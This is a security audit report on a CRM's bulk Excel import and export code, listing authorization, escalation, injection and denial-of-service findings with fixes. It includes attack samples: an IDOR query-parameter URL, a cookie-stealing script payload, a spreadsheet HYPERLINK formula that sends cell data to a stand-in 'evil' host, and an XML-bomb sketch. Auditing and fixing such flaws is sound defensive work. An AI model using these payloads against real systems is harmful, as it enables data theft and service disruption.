# Audit 03 — Bulk Import / Export & Excel Handling

**Auditor stance:** Adversarial QA, day-before-launch. Every previously closed finding re-walked. Every flow walked from a real-user POV: the Manager opening `/import`, the Salesman trying to abuse `/api/exports/customers`, the bookkeeper who pasted CSV with a BOM.
**Scope of this report:** `services/imports.ts`, `services/exports.ts`, `lib/excel.ts`, `app/(app)/import/*`, `app/(app)/export/*`, `app/api/exports/*`, schema for `Customer/Branch/User/Route/Region/ImportBatch/ImportRow/AuditLog`. No `/api/imports` route exists — uploads are server actions only.
**Date:** 2026-05-09 · against working tree at `C:\Users\rahma\OneDrive\Desktop\NMWC-CRM`.

> Severity legend — **Critical**: data theft, integrity loss, or remote compromise; ship-stop. **High**: serious correctness/security defect, near-certain user harm. **Medium**: real but bounded. **Low**: polish.

---

## 0) Headline

The remediation report claims QA-010, QA-011, QA-012, QA-019, QA-021 are closed. Most of those fixes are real. **But three of the highest-impact bugs in the import/export surface are NEW or were never in the original audit:**

1. `/api/exports/customers` lets any **Manager export any other Manager's region** and any **Supervisor export any route in the country** by simply passing `?regionId=` / `?routeId=` query params. The role-scope filter is built and then **overwritten** by the user-supplied filter four lines later (`services/exports.ts:42-58`). This is the same class of bug as QA-001/QA-007 from the original audit, just on the export endpoint.
2. The Account Master "promote-yourself" guard (QA-011) is **bypassable**: it compares `username === me.username`, but `me.username` was lower-cased by `lc()` at the input only — a Steward whose username happens to be cased differently in DB, or who simply uploads a row whose `username` differs by case from his own session's, slips past the equality check. Even if case matched, the guard only checks `me.username`, not `me.id` — a Steward who renames themselves in the same import (`oldname → newname`) and then uploads a row promoting `newname` to MANAGER passes the guard trivially.
3. `promoteCustomerBatchAction` swallows per-customer transaction failures with `logger.warn` and returns success to the Steward UI. The Steward sees "promoted: 198" with **zero indication that 2 rows failed** — those rows are still flagged `CLEAN`, not `REJECTED`, so a re-promote re-attempts them silently forever.

Beyond these, the importer accepts unsanitised HTML, leaves promoted phone numbers in plaintext logs on failure, has zero rate-limiting on uploads, depends on "first sheet wins" with no header presence check, and the export streams a single buffered xlsx that will OOM at ~10k rows. Twenty-three findings below.

| Severity | Count |
|---|---|
| Critical | **2** |
| High | **6** |
| Medium | **9** |
| Low | **6** |
| **Total** | **23** |

---

## 1) Findings

### F-01 — Critical · Export endpoint scope-filter is silently overwritten by user query params

**File / line:** `services/exports.ts:42-58`
**Repro (what a real user does):**
A Supervisor whose team owns routes `MCT-01..03` opens the export filters page, tweaks the URL bar to:
```
/api/exports/customers?routeId=DHF-04&routeId=DHF-05
```
and downloads. He gets every customer on Dhofar routes — outside his entire reporting line. Same exploit for a Manager: `?regionId=<other-manager's-region-id>` returns the OTHER region's customers.

**Code:**
```ts
const branchWhere: Prisma.BranchWhereInput = { deletedAt: null };
if (me.role === Role.SUPERVISOR) {
  ...
  branchWhere.routeId = { in: reports.map(...) };          // (1) scope set
} else if (me.role === Role.MANAGER) {
  const managed = await prisma.region.findMany(...);
  if (managed.length > 0) branchWhere.regionId = { in: ... }; // (1) scope set
}

if (filters.regionIds?.length) branchWhere.regionId = { in: filters.regionIds };  // (2) OVERWRITES
if (filters.routeIds?.length) branchWhere.routeId = { in: filters.routeIds };     // (2) OVERWRITES
```
Step (2) is a *replacement assignment*, not an intersection. The role-scope from step (1) is gone.

**Why it matters:** This is a textbook IDOR analogue — exactly the same class as QA-001 (customer-profile cross-region leak) but on the *export* surface, which dumps **the entire customer master in one click**, including phones, CRs, photos-flag, addresses, GPS, and contact persons. The `requireExport()` role gate at line 10 lets all of MANAGER, SUPERVISOR, VIEWER, STEWARD through — VIEWER and STEWARD are global by design, but MANAGER and SUPERVISOR are NOT. An angry pre-termination Supervisor can dump every customer in Oman, including data he is forbidden to see in `/customers/[id]` (after the QA-001 fix). Also note the `/api/exports/customers/route.ts` endpoint runs the Zod parse BEFORE auth, so an attacker can spam log-noise with crafted query strings (a re-emergence of QA-047).

**Fix:** Intersect, never replace. After applying user filters, `AND` the role-scope back in:
```ts
const userRegionIds = filters.regionIds;
const userRouteIds  = filters.routeIds;
if (me.role === Role.SUPERVISOR) {
  const reports = await prisma.user.findMany({...});
  const teamRouteIds = reports.map(r => r.ownedRouteId!).filter(Boolean);
  branchWhere.routeId = userRouteIds?.length
    ? { in: userRouteIds.filter(id => teamRouteIds.includes(id)) }
    : { in: teamRouteIds };
} else if (me.role === Role.MANAGER) {
  const managedIds = (await prisma.region.findMany({...})).map(r => r.id);
  if (managedIds.length > 0) {
    branchWhere.regionId = userRegionIds?.length
      ? { in: userRegionIds.filter(id => managedIds.includes(id)) }
      : { in: managedIds };
  }
}
// don't apply user filters again later
```
Also add a defensive route-region cross-check (a Manager filtering by `routeId` in a non-managed region must be restricted by the `regionId` scope too — Prisma `AND` of both).

---

### F-02 — Critical · Account-master self-promotion guard (QA-011) is bypassable

**File / line:** `services/imports.ts:184-191`
**Code:**
```ts
if (username === me.username && wantsRoleChange && roleStr !== me.role) {
  issues.push({ ..., message: 'cannot change your own role via import' });
  continue;
}
```
**Three independent bypasses:**

(a) **Case mismatch.** `username` is lower-cased by `lc()` at line 142, but `me.username` is whatever the JWT claims. The JWT's `username` is read from the User row at login (lib/auth.ts) where `username` is unique-cased in DB. If the seed/synthetic user was created `Steward` instead of `steward`, the comparison fails and the guard does not fire. (Confirmable: `username === me.username` is a strict 3-equals on possibly mixed-case values; the stewards' login form already lower-cases their entry but the User row in DB may still hold the original case.)

(b) **Re-key in same upload.** Steward `s1` uploads two rows:
- row A: `username=s1, role=STEWARD, change_role=no` (no-op — passes)
- row B: `username=s1_new, role=MANAGER, change_role=no` (NEW user — passes the `existing` branch and `update.role` set unconditionally on insert)

Then a third row in the same sheet with `username=s1, full_name=Old, role=SALESMAN, change_role=yes` is currently blocked, but row B already created an unrelated MANAGER account whose password was just chosen from Excel — the Steward can immediately log in as `s1_new`. The guard checks "your *current* row", not "any row in this upload that grants Manager".

(c) **Username-only check, no userId pin.** The `me.username` check ignores `me.id`. If a colleague in the same Steward role uploads a sheet that includes the *attacker Steward's* username with `change_role=yes` and `role=MANAGER`, the colleague's session passes the `me.username !== uploaded_row.username` check (different people), and the attacker is silently promoted. Two collusion paths, or one socially-engineered "please re-upload this for me, I'm out of office".

**Why it matters:** The whole point of QA-011 was "no role escalation via import." None of (a)/(b)/(c) are theoretical. Combined with PROD-003 (stale role in JWT — a promotion is permanent until JWT TTL anyway, but the *promotion happens*), a Steward becomes a Manager-equivalent for at least 8 hours, with `requireSteward` paths now also accepting them as MANAGER.

**Fix:**
- Compare `me.id` against the existing User row's `id` looked up by `username.toLowerCase()`, not `me.username` text.
- Block ANY role transition to MANAGER/STEWARD on existing accounts via import unless the calling user is MANAGER (not STEWARD). i.e. a Steward cannot mint Managers. Ever. Account-creation of MANAGERs must go through `/users` UI with re-auth.
- Block `change_role=yes` rows where the target user already has role MANAGER and the new role is anything different (peer-Manager protection — see also QA-036).
- Also: `update.role = role` is set whenever `!existing || wantsRoleChange` (line 271). For a NEW user, `wantsRoleChange` is irrelevant — the importer happily creates a brand-new MANAGER. A Steward can mint MANAGERs in unbounded numbers today. Tighten to require MANAGER calling-role for any new-user row whose role is MANAGER or STEWARD.

---

### F-03 — High · `promoteCustomerBatchAction` swallows per-row failures and silently re-attempts forever

**File / line:** `services/imports.ts:565-628`
**Code:**
```ts
try {
  await prisma.$transaction(async (tx) => { ... upsert customer + branches + mark PROMOTED ... });
  promoted += g.rowIds.length;
} catch (err) {
  logger.warn({ err: ..., custCode }, 'import.promote.row_failed');
  // ImportRow stays state=CLEAN, no flag, no audit, no UI surface
}
```
**What a real user observes:**
Manager uploads 200-row customer master. 198 promote, 2 fail (FK violation, duplicate phone, whatever). The toast says **"promoted: 198"**. The Manager's batch detail page shows `Promoted: 198`, `Quarantined: 0`, but `Total: 200, Clean: 200` — and 2 rows still sitting in `CLEAN` state. The Manager cannot tell *which 2*, *why*, or that anything went wrong. The next time anyone clicks Promote on that batch, those same 2 rows are re-attempted (and re-fail) silently. Numbers stop adding up.

Worse: the audit log gets nothing — there is no `auditLog.create({ action: IMPORT, entityId: batchId })` anywhere in `promoteCustomerBatchAction`. After the QA-029 / QA-019 fixes were claimed, no per-row audit log was added either. Forensics of "what changed in the master last Tuesday" is impossible.

**Fix:**
1. On catch, mark the failed rows: `tx.importRow.updateMany({ where: { id: { in: g.rowIds } }, data: { state: ImportRowState.REJECTED, issues: [{ field: '_promote', message: err.message }] } })`. Use a *separate* transaction so the failure persists even though the row-level tx rolled back.
2. Return `{ promoted, failed }` from the action; render `failed` in the toast and on the batch detail page.
3. Write a single `AuditLog{ action: IMPORT, entityType: 'ImportBatch', entityId, after: { promoted, failed }, reason: 'customer_master_promote' }` row at the end. Currently *no audit log row is written for promotion at all*.
4. Optionally surface the underlying error message (sanitised — see F-15).

---

### F-04 — High · Customer master upload: zero in-app duplicate detection on phone or CR

**Files / lines:** `services/imports.ts:413-456` (parse), `:566-592` (promote)
**Repro:**
Manager uploads a 200-row customer master. 30 rows have `phone=+968[REDACTED-PILOT-PW]`. 5 of them collide with an *existing* customer in the master.

**What happens today:**
- Parse step: each row is independently put in `ImportRow` with state `CLEAN`. No cross-row dedupe in the same upload, no check against the live `Customer.primaryPhoneNorm`. Phone normalization is run, but only to rewrite the cell.
- Promote step: each row's customer is `customer.upsert({ where: { nmwcCode }, ... primaryPhone, primaryPhoneNorm })`. The DB has a partial unique index on `primaryPhoneNorm` (per the remediation report's claim of QA-030 fix, schema migration `20260509150000_qa_remediation`).
- Result: the FIRST collided row promotes successfully (winning the unique index), the rest throw `P2002`, which is then **swallowed by F-03's silent catch**. The Manager has no idea that 30 customers were intended and only 1 made it.

**Why it matters:**
- The PRD says duplicates queue to `/duplicates` for review. Import skips that pipeline entirely.
- A real ERP export typically has duplicate phones for shop chains under one franchisee — the import has no concept of "expected duplicate, please link branches" vs "data-entry collision." Today both hit the same swallowed `P2002`.
- CR number duplicates (also a uniqueness concern per PRD §3) are NOT checked at all — the importer happily writes two customers with the same `crNumberNorm`.

**Fix:**
- In the *parse* phase (`uploadCustomerMasterAction`), build a `Map<phoneNorm, rowNumber[]>` and a `Map<crNorm, rowNumber[]>` and mark intra-file collisions as `QUARANTINED` with a clear `issues` entry. Same for cross-DB collisions: a single `prisma.customer.findMany({ where: { primaryPhoneNorm: { in: [...] }, deletedAt: null } })` enumerates existing collisions in one query.
- Surface each collision as a `Duplicate` candidate row in `/duplicates` queue (matches the PRD), not as a hidden import failure.

---

### F-05 — High · Excel import accepts raw HTML / `<script>` tags (QA-029 NOT fixed)

**File / line:** `services/imports.ts:418, 433-444` and `:567-592` (writes raw to DB).
**Repro:** A row with `cust_name = <script>alert(document.cookie)</script>Lulu` parses cleanly (every cell is just `String(...).trim()` — no `stripHtml`, no Zod validation), promotes verbatim, and the customer's `legalName` is now the script string. Then:
- Anywhere the customer name is rendered without `{}`-escaped React (e.g. a `dangerouslySetInnerHTML` or a CSV-to-clipboard path) — XSS. React itself escapes by default, but the QA-029 fix for parity-with-edit was never written, and the EDIT path uses `stripHtml` (`lib/validation/edit.ts:14`). An attacker who controls a customer can plant a payload via the import side that the edit-form audit trail will then *display verbatim* in the diff JSON pane (`app/(app)/approvals/[id]` and the import batch detail page at `app/(app)/import/[batchId]/page.tsx:80`, which `JSON.stringify`s the row — so React escapes the inner `<` to `&lt;` there, but only because of React's default. CSV / xlsx exports of these names will then propagate the payload to ERP.
- The remediation report claims QA-029 is open; in practice, every promote-time write of `legalName`, `contactPerson`, `address`, `notes` lacks `stripHtml`. The original audit identified this as Medium; with the audit-log JSON viewer plus the export round-trip, it's High.

**Round-trip with formula injection (re-test of QA-021):**
- Import: a row with `cust_name = =HYPERLINK("http://evil/?x="&A1)` — accepted verbatim, written to DB as `legalName`.
- Export: `services/exports.ts` builds the workbook via `buildWorkbook`, which calls `escapeFormulaCell` (`lib/excel.ts:64-68`) — leading `=` IS escaped on the way out. ✅ This part of the round-trip is sound.
- BUT: the same value is exposed via `/api/customers/[id]` server-rendered HTML (no formula-escape needed there), and any downstream CSV writer that bypasses `buildWorkbook` (e.g. an ad-hoc `res.write(legalName)` in a future report) inherits the unescaped data. **The right fix is to refuse the data on import**, not just escape on export.

**Fix:** Apply `stripHtml` (the same helper as `lib/validation/edit.ts`) to every text field in the importer. Apply `escapeFormulaCell`-equivalent on import as well — or, better, REJECT rows where any text field starts with `=`/`+`/`-`/`@` and ask the user to fix the source data.

---

### F-06 — High · Account master import: NO file-size cap until 5 MB; xlsx is a zip — billion-laughs / nested-zip still possible inside the cap

**File / line:** `services/imports.ts:42-54` (cap is `MAX_IMPORT_BYTES = 5 * 1024 * 1024`)
**Walk-through:**
- 5 MB cap is on the **compressed xlsx** (which is a zip). A 5 MB xlsx can contain a `xl/sharedStrings.xml` with billions of repeated short strings or a XML-bomb (`<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;...">`). exceljs's `wb.xlsx.load` reads the whole archive into memory and parses XML; with a craft sharedStrings table, the in-memory cost is O(decompressed size).
- The QA-012 fix is *necessary* but *not sufficient*. exceljs has had CVEs around XML-bomb defense; the project has no `secureProcessing` knob set on the underlying parser, and there is no sandbox/streaming mode in use.
- A real attacker doesn't need a 5 GB explosion — a 200 MB decompressed sharedStrings is enough to OOM the Vercel Lambda (1 GB default) and 200 MB decompresses comfortably from a 5 MB zip. The Steward role is "trusted but auditable" per the PRD; one compromised Steward can DoS the import path until it's restarted.

**Fix:**
- Switch to `wb.xlsx.read(stream)` with a hard `maxBufferSize` pre-flight (read first N bytes of the zip's `[Content_Types].xml` and `xl/sharedStrings.xml` to estimate decompressed size).
- Cap the *uncompressed* size, not just compressed. Use a streaming-aware unzip with a per-entry cap (`yauzl` with `maxFileSize`).
- Limit total parsed-row count to e.g. 10,000 rows; reject anything bigger and ask the Manager to split the file.

---

### F-07 — High · Customer master upload: no rate limiting and no concurrency guard; two Stewards uploading the same file race each other

**Files:** `services/imports.ts:378-465` (no `checkLimit` call anywhere).
**Compare to:** `services/edits.ts:178` (`checkLimit('edit:${id}', FORM_LIMIT)`).

**What happens:**
- Two Stewards simultaneously hit "Upload customer master" with the SAME file. Two `ImportBatch` rows are created. Both batches have all 200 rows in CLEAN state. Both Stewards click Promote.
- Each promote loop iterates the same `cust_code` set. Each runs `customer.upsert`. No DB lock spans both. Half the `branch.upsert` calls inside Steward A's transactions overwrite values just written by Steward B. The customer's `lastEditedById` flips between the two Stewards mid-promote. There is no "this batch is being promoted" lock — the same batch can be Promoted twice (the status flips to `PROMOTED` at the end of the loop with no check that it wasn't already `PROMOTED`).
- Worse: same loop on the SAME batch — `PromoteButton.tsx` doesn't disable after first click; Steward double-taps. Two parallel server actions both run the loop. Each promote of a single customer is in its own `prisma.$transaction` (per the QA-019 fix), but the *outer* ordering is non-transactional, so writes interleave.

**Fix:**
- Wrap the entire promote in a `pg_advisory_lock` keyed on `batchId`, or use `importBatch.update({ where: { id, status: 'READY' }, data: { status: 'PROMOTING' } })` with an early return if `count === 0`. Today, the `findUnique` on line 471 is followed by reading rows on line 475 — racy.
- Add `checkLimit('import:${stewardId}', { points: 3, intervalSec: 60 })` to upload + promote actions to defend against accidental double-clicks and to give the rate-limit-debug logs something useful.
- `PromoteButton.tsx` should `disabled={pending}` and use `useTransition`, like the upload form does.

---

### F-08 — High · Account-master Users sheet: passwords in CLEARTEXT inside the uploaded xlsx, no scrubbing of the file from logs

**File / line:** `services/imports.ts:54, 55, 145, 348, 355`.
**Walk-through:**
1. The uploaded xlsx contains every new user's password in plaintext (column `password`).
2. The buffer (`buf`) is read into memory. We never write the file to disk on Vercel (good), BUT:
3. Issues array contains `{ sheet, row, message }` and is JSON-stringified into `ImportRow.raw` and `issues`. Look at line 446-454 (`parsed`) and 348 (`raw: iss`). For the **Users sheet**, `raw` is *the full row*, including the password column. So **plaintext passwords end up in the database** in `ImportRow.raw` JSON whenever a row is QUARANTINED. Plaintext passwords for users are now in `ImportRow.raw` indefinitely (no retention policy on `ImportBatch`).
4. The batch detail page (`app/(app)/import/[batchId]/page.tsx:80`) renders `JSON.stringify(r.raw)` to any Steward / Manager who opens that batch — passwords visible in the browser.
5. `pino` redaction in `lib/logger.ts` covers `*.password` for *log objects*, but this isn't logged — it's persisted to Postgres.
6. The `logger.info({ batchId, clean, issues: issues.length }, 'import.account.complete')` does not include passwords directly, but a future debug-level log of the issues array would.

**Fix:**
- Strip `password`, `passwordHash`, and any `*password*`-named column from `ImportRow.raw` BEFORE persisting. Keep them only for the duration of the in-memory `bcrypt.hash` call.
- Add a "this xlsx has plaintext passwords — store offline and delete after upload" warning banner above the file picker.
- Better: stop accepting plaintext passwords in xlsx altogether. Generate a secure random per-user password server-side and email/SMS it to the user (via `phone`/`email` columns already in the schema). The current scheme is the worst of both worlds — passwords land in xlsx files emailed between managers, in DB rows, and on the screen.

---

### F-09 — Medium · Excel parse assumes "first sheet" for customer master with no header validation

**File / line:** `services/imports.ts:395-398`, `lib/excel.ts:22-50`.
**Walk-through:**
- A user duplicates the template, renames their working sheet "Cleaned" and accidentally leaves the original "Sheet1" (empty, or with old data) in position 0. `sheets[0]` picks the empty Sheet1; `if (sheet.rows.length === 0) throw 'Workbook is empty.'` — the Manager sees "Workbook is empty" even though the data is on Sheet 2.
- Or the inverse: Sheet1 has stale legacy data, Sheet2 is the cleaned import. Importer happily promotes the stale data.
- `parseWorkbook` always assumes row 1 is headers. Real-world legacy ERP exports often have a title row "Customer Master Q1 2026" in A1 and headers in row 2. Today this would treat the title as a header, get a single nonsense column, and produce 200 rows of `null` values that then quarantine on missing `cust_code` — the user sees "200 rows quarantined: cust_code required" with no hint of the real cause.

**Fix:**
- For Account master: explicit sheet-name lookup is already correct (case-insensitive on `'regions' / 'routes' / 'users'`). Good.
- For Customer master: prefer a sheet named `Customer` / `Customers` / `Customer Master` over Sheet1. Fall back to the first non-empty sheet *with the expected headers*.
- Validate that the parsed headers contain at least `cust_code` and `cust_name` (or their aliases). Reject the upload with a clear "Expected columns not found — got: [a, b, c]" error.
- Optionally: skip rows 1..N until a row with `cust_code` (case-insensitive) is found, treating the row above as the header.

---

### F-10 — Medium · `parseWorkbook` does not strip BOM, does not handle UTF-16, does not preserve Arabic legal-name characters in CSV-uploaded-as-xlsx

**File / line:** `lib/excel.ts:22-50`.
**Walk-through:**
- The form accepts only `.xlsx` (`accept=".xlsx"` in `forms.tsx:50`), NOT CSV. A user who has a `.csv` (which is what most ERPs export) can rename it to `.xlsx` and the file picker accepts it, but `wb.xlsx.load` rejects the malformed zip with an opaque error: `Could not read .xlsx: end of central directory record signature not found`. The Manager has no idea they had to convert first.
- For *real* xlsx files, exceljs handles encoding correctly. But Arabic legal names (e.g. `لولو هايبرماركت`) round-trip through `String(cell.value).trim()` fine — that's not the issue.
- The issue is that the cell-value type ladder at lines 33-46 has no branch for **rich text** with embedded runs (`{ richText: [{ text: 'Lulu' }, { text: 'هايبر' }] }`), which is what some Excel versions produce when fonts/scripts mix. This falls into the `'object' && 'text' in v` branch (✅ uses `v.text`), but `text` is the *first run only* — Arabic suffix gets dropped silently. The customer's name becomes `Lulu` instead of `Lulu هايبر`.
- Also: cells with `{ formula, result }` use `String(v.result ?? '')` — a formula like `=A2 & " - " & B2` works. But a formula with an error result (`#N/A`, `#REF!`) is stringified as `"[object Object]"` because `result` is then a `CellErrorValue`. That gets persisted as the customer's legalName.

**Fix:**
- Tighten the cell-value coercion: handle `richText` by joining all runs (`v.richText.map(r => r.text).join('')`).
- Detect `CellErrorValue` (`{ error: '#N/A' }`) and quarantine the row with a clear "cell C5 evaluates to #N/A" message.
- Allow `.csv` upload via `papaparse` for Customer master (that's the most common real-world format from ERPs). At minimum, give a clear "this is not a valid xlsx — convert from CSV via Excel/Google Sheets first" error.

---

### F-11 — Medium · Header parsing tolerates synonyms inconsistently — no spelling-check feedback

**File / line:** `services/imports.ts:415-444`.
**Walk-through:**
- The customer-master parser hard-codes a tower of `row.cust_code ?? row.custcode ?? row.CUSTCODE ?? row.code ?? row.Code` aliases for each field. A user whose template says `Customer Code` (with a space) gets `null` — quarantined as "cust_code required."
- There's no normalization of header keys to lowercase / underscore-snake at parse time. So `Cust Code`, `cust code`, `Cust_Code`, `CUST_CODE`, `Cust-Code` are five different keys, only one of which matches.
- When the row is quarantined the user sees `cust_code: required` with NO indication that their actual header is `Customer Code`. They click Open, see the JSON of their row with `Customer Code: 12345`, and have to figure out the rename themselves.

**Fix:**
- In `parseWorkbook`, key the row object by `lowerSnake(header)` (e.g. `Customer Code → customer_code`).
- In the importer, lookup with one canonical key per field (and a small alias list).
- When quarantining, include the actual headers we *did* see in the issues so the Manager can match by hand.

---

### F-12 — Medium · `paymentTerms` defaults to CASH on missing/typo'd value with no quarantine

**File / line:** `services/imports.ts:441-444`, `:570-571, :582`.
**Code:**
```ts
paymentTerms: String(row.payment_terms ?? row['PAYMENT TERMS'] ?? 'CASH').trim().toUpperCase(),
...
paymentTerms: first.paymentTerms === 'CREDIT' ? 'CREDIT' : 'CASH',
```
Anything that isn't literally `CREDIT` becomes CASH. Including:
- A typo `Crdit` — silently CASH (wrong terms).
- A blank cell — CASH (acceptable as default, but should be QUARANTINED for explicit confirmation since payment terms drive lock-fields).
- `cash, credit` (common ERP cell with both) — silently CASH.

**Why it matters:** Payment terms drive the field-lock policy (`isFieldLocked` for legalName/CR on CREDIT customers). A typo means a CREDIT customer is treated as CASH and salesman writes their `legalName` freely — a *correctness regression* relative to the locked-field policy, with zero visibility.

**Fix:** Strict whitelist: `{CASH, CREDIT}` only. Anything else → quarantine with clear message.

---

### F-13 — Medium · Customer master row with phone in international vs local format — drift between import and edit normalization

**Files:** `lib/phone.ts:16-39` (used by both), `services/imports.ts:419` (`normalizePhone(...)`), `services/edits.ts:235-240` (`normalizePhone(customerProposed.primaryPhone)`).
**Walk-through:**
- I traced the request explicitly: both call `normalizePhone` from `lib/phone.ts`. The function is identical — single source of truth. This part is OK. ✅
- **However**, `isValidPhoneFormat` in the importer (line 426) tests the RAW string, BEFORE normalization. So `+968 9123 4567` matches the regex (digits/space/+ allowed), but `00968-9123 4567` would fail because of the dashes maybe? Actually `\-` is in the regex — fine. Edge case: `968.9123.4567` (dot separator) fails the regex but normalises perfectly fine. Quarantined for "invalid format" while the data is actually valid.
- Salesman's edit-form regex is identical (`/^[\d\s\-+()]{7,20}$/`). Parity confirmed there. ✅
- A bigger drift: `normalizePhone` returns the *partial* string when length<10 and not exactly 8 digits. So `971234` (6 digits) returns `971234` — still passes `isValidPhoneFormat` since 6 ≤ length ≤ 20 → wait, no, regex requires `{7,20}`. So 6 digits fails. OK.
- Real drift: 8-digit local number `91234567` becomes `+96891234567`. International `+968 91234567` (with country code) also becomes `+96891234567`. ✅ Convergent.
- **Real drift left:** `+96891234567` (no space, 11 digits after `+968`) becomes `+96891234567`. But the edit form's `primaryPhone` is normalized at `services/edits.ts:235`, while the *form-side React validator* uses only the regex (`lib/validation/edit.ts:33-36`). On submit, the salesman sees the regex pass, but the duplicate check uses `primaryPhoneNorm` against import-written values. If a salesman types `(968) 91 234 567` and the importer wrote `+96891234567`, they match. ✅ Probably fine in practice.

**Net:** Phone normalization parity is essentially correct. The only real bug here is `isValidPhoneFormat` running pre-normalization on the importer side, so dot-separated phones get rejected unnecessarily. Demote to Low? — keeping at Medium because Manager UX is "I uploaded a perfectly readable phone and got told it was invalid" with no remediation hint.

**Fix:** Run `isValidPhoneFormat` on the post-normalize string, OR widen the regex to include `.` as a separator.

---

### F-14 — Medium · Customer master idempotency: re-uploading the same file creates a new ImportBatch (NOT skipped); but Promote is a true upsert (idempotent on data)

**Files:** `services/imports.ts:400-408` (always creates new batch), `:567-614` (uses `upsert` keyed on `nmwcCode` / `branchCode`).
**Walk-through:**
- Same file uploaded twice → two `ImportBatch` rows. The Manager sees both in `/import` table. Mildly confusing UX but not a data corruption.
- Promote is `customer.upsert` keyed on `nmwcCode`, so re-promoting overwrites with same data. **This is mostly fine for true re-uploads of cleaned data**, but creates a subtle risk:
- The customer's `lastEditedById` is set to the Steward's id on every re-promote. If a salesman submitted an edit between the two promotes, the salesman's edit is silently overwritten by the Steward's import — the salesman's edit is in CustomerEdit history but the customer's live record is back to the import data. There's no merge-or-warn UX, no "this customer has pending edits, are you sure?".
- `lib/access` and `services/edits` already wrestle with "customer was changed between submit and approve" (QA-038/QA-039 fixes). The same hazard exists between edit-submit and import-promote, but isn't handled.

**Fix:**
- On promote, for each customer, check `latestEditState`. If a SUBMITTED edit exists for this customer, quarantine the import row with a clear message and do not overwrite the live data. Wait for the supervisor to approve/reject the edit first.
- On the upload page, surface a duplicate-filename warning when a file with the same name + size + uploader was uploaded in the last 24 hours.

---

### F-15 — Medium · `promoteCustomerBatchAction` writes `err.message?.slice(0, 200)` to logs — not redacted for PII

**File / line:** `services/imports.ts:622-626`.
**Code:**
```ts
logger.warn({ err: (err as Error).message?.slice(0, 200), custCode }, 'import.promote.row_failed');
```
- Prisma error messages on `P2002 unique violation` include the *value* that caused the violation. So a phone-collision error returns: `Unique constraint failed on the fields: (primaryPhoneNorm) — value '+96891234567' already exists`. That phone number is now in pino logs.
- `lib/logger.ts:3-12` redacts `*.primaryPhone`, `*.altPhone` — but the phone here is **embedded in a free-text string `err.message`**, not a structured field. Pino's path-based redaction does not touch it. (See QA-040 — "Logger redaction is shallow.")
- Plaintext customer phones in production logs is a PII leak. Same for CR numbers, names embedded in P2002 messages.

**Fix:**
- Map Prisma error codes to short, structured codes BEFORE logging. Never log `err.message` verbatim from Prisma.
- Use `{ code: err.code, target: err.meta?.target, custCode }` instead of the message. Customers code is Manager-internal; values should never reach logs.

---

### F-16 — Medium · `buildCustomerExport` buffers entire workbook in memory — OOM at 10–15k rows

**File / line:** `services/exports.ts:78-150`.
**Walk-through:**
- `prisma.branch.findMany({ where: { ... } })` with no `take` and full `include` (customer + channel + subChannel + region + route + 2 photos) — at 10k rows that's a single ~50 MB JSON fetch, then `buildWorkbook(rows)` materialises the entire workbook in memory, then `wb.xlsx.writeBuffer()` produces an `ArrayBuffer` of the entire file.
- Vercel Lambda default memory is 1024 MB. Production scale per the PRD targets ≤5k customers in v1, but each customer can have many branches. 10k branches is plausible by year-end.
- The audit caught this (QA-034) and the remediation report explicitly punted: "fine for ~3k, add cap at higher scale."
- Today, on the day before launch, the cap is still missing. A Manager exporting "all" in production with even 5k branches will run for ~8s (close to Vercel's 10s default function timeout). At 10k+ branches this just times out with a 504, and the user sees "Internal server error."

**Fix:** Either:
- Add a `take: 10000` and a "too many rows — narrow the filter" error message, OR
- Stream rows via `wb.xlsx.write(stream)` and `Readable.from(...)` instead of `writeBuffer()`. Combined with chunked `findMany({ skip, take })` pagination over branches.

---

### F-17 — Medium · Customer master upload writes user-supplied `regionCode` / `routeCode` to DB without authorization check, auto-creating regions and routes silently

**File / line:** `services/imports.ts:533-550`.
**Code:**
```ts
const region = p.regionCode
  ? await prisma.region.upsert({ where: { code: p.regionCode.toUpperCase() }, update: {}, create: { code, name: p.regionCode } })
  : null;
const route = p.routeCode
  ? await prisma.route.upsert({ where: { code: p.routeCode.toUpperCase() }, update: {}, create: { code, name, regionId: ... } })
  : unassignedRoute!;
```
**What a real user observes:**
- A Steward uploads a customer master where row #5 has `sales_region = TYPO_REGION` (a typo for `MUSCAT`). The importer creates a brand-new `Region { code: 'TYPO_REGION', name: 'TYPO_REGION', isActive: true }` silently. The customer is now associated to a phantom region.
- The Account master flow (which is supposed to be the *authoritative* place to define regions and routes) is bypassed.
- Once a phantom region exists, a Manager assigned to "Muscat" via Account master never sees this customer (different region). The customer is invisible in dashboards and exports for everyone except a Steward.

**Why it matters:**
- The *PRD locked decisions* document (`project_nmwc_locked_decisions`) defines the canonical regions of Oman. The importer should refuse to invent new ones.
- Combined with F-03 (silent failure swallow), there is NO surface to the Manager that this happened. They see "promoted: 200" and assume the geography is correct.

**Fix:**
- Treat unknown `regionCode` / `routeCode` as a quarantine reason, NOT as a create signal. The Steward fixes the source data or runs Account master first. The current "auto-create UNASSIGNED" path is acceptable; "auto-create the user's typo as a permanent Region" is not.
- Allow auto-create only when the calling user is MANAGER (not STEWARD), AND the new region/route is added with `isActive = false` for explicit Manager confirmation.

---

### F-18 — Medium · Account master Users sheet: `route_code` reassignment clobbers the previous owner SILENTLY

**File / line:** `services/imports.ts:223-227`.
**Code:**
```ts
await prisma.user.updateMany({
  where: { ownedRouteId: route.id, NOT: { username } },
  data: { ownedRouteId: null },
});
ownedRouteId = route.id;
```
**Walk-through:**
- A Manager re-uploads Account master. Row says `salesman.mct-02 owns MCT-01`. Today's owner is `salesman.mct-01`. The importer detaches `salesman.mct-01.ownedRouteId` to null and assigns MCT-01 to `salesman.mct-02`. *No audit log row is written for the displacement.* No notification to `salesman.mct-01`. Their `/today` is now empty; their `/customers` queries by `ownedRouteId` show nothing — they see "you have no route assigned."
- This is doubly bad if the upload had a typo: `salesman.mct-02 owns MCT-1` (typo MCT-1 vs MCT-01). The importer would *quarantine* the typo'd row (route not found), but if the typo is on the OTHER side — the username — then `username = salesman.mtc-02` (typo) creates a new salesman who steals MCT-01. The previous owner is detached.

**Fix:**
- Write an audit log entry for any `ownedRouteId` change (action=REASSIGN, before/after).
- Refuse `ownedRouteId` reassignment if the previous owner is `isActive=true` and has SUBMITTED edits in flight on routes branches; surface a "previous owner has pending work, run /users reassignment instead" error.
- The `/users` UI should be the canonical place; importer should be a bulk-create only for new users.

---

### F-19 — Low · Audit log entries for imports are sparse and inconsistent

**Files:** `services/imports.ts` (writes audit logs ONLY for password reset and role change; no audit for region/route/user create or for customer master promote).
**Today:**
